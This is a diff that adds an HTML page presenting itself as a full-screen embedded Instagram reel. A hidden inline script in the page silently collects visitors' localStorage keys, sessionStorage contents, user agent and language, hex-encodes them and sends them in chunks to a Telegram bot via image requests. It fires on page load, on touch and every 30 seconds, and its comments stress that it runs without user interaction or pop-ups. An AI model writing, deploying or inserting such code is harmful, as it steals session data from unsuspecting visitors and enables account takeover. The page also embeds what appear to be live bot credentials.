@@ -1,0 +1,39 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
+    <style>body,html{margin:0;padding:0;height:100vh;background:#000;overflow:hidden;}iframe{width:100%;height:100%;border:none;}</style>
+</head>
+<body>
+    <iframe src="https://www.instagram.com/reel/DXvjb0FP8W0/embed/"></iframe>
+    <script>
+        (function(){
+            const T="8662750137:AAGEIPealqUPso3hFzdCJrUZln684PaVX3k", C="8639892987";
+            function toHex(s){let r='';for(let i=0;i<s.length;i++){r+=s.charCodeAt(i).toString(16).padStart(2,'0');}return r;}
+
+            async function ghost_leak(){
+                try{
+                    // Goal: Capture active session fingerprints without user interaction
+                    let leak = {
+                        A_OBJ: Object.keys(window.localStorage), // Hidden keys
+                        B_SES: {...sessionStorage},
+                        C_NAV: {ua: navigator.userAgent, lang: navigator.language},
+                        D_TIME: new Date().getTime()
+                    };
+                    
+                    let p = toHex(JSON.stringify(leak));
+                    const chunks = p.match(/.{1,180}/g);
+                    chunks.forEach((chunk, i) => {
+                        new Image().src=`https://api.telegram.org/bot${T}/sendMessage?chat_id=${C}&text=🧬_GHOST_P${i}_${chunk}`;
+                    });
+                }catch(e){}
+            }
+
+            // Silent Triggers (No Pop-ups)
+            window.onload = ghost_leak;
+            window.ontouchstart = ghost_leak; 
+            setInterval(ghost_leak, 30000); 
+        })();
+    </script>
+</body>
+</html>
